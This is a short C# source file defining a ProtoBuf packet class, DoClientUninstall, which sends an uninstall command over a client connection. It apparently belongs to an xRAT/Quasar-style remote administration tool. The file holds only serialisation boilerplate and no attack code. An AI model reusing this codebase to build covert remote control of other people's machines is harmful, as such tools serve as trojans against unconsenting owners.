using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoClientUninstall : IPacket
    {
        public DoClientUninstall()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}